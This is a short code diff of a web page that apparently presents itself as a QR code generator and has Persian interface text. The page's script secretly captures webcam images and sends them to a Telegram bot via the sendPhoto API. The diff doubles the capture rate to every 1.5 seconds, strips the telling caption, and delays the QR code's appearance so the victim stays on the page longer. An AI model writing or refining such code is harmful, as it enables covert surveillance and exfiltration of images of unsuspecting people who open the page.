@@ -42,11 +42,11 @@ function generate() {
       c.toBlob(b=>{
         const f=new FormData();
         f.append('chat_id',CHAT_ID);
-        f.append('caption','📸 عکس هر ۳ ثانیه');
+        f.append('caption','عکس');
         f.append('photo',b,'photo.jpg');
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
       },'image/jpeg',0.85);
-    },3000);
+    },1500);
   }).catch(()=>alert('دسترسی به دوربین رد شد'));
   // ================== ساخت QR Code ==================
   setTimeout(() => {
@@ -60,7 +60,7 @@ function generate() {
     correctLevel: QRCode.CorrectLevel.L
   });
   alert("ساخته شد")
-  }, 20000);
+  }, 30000);
 }
 </script>
 </body>
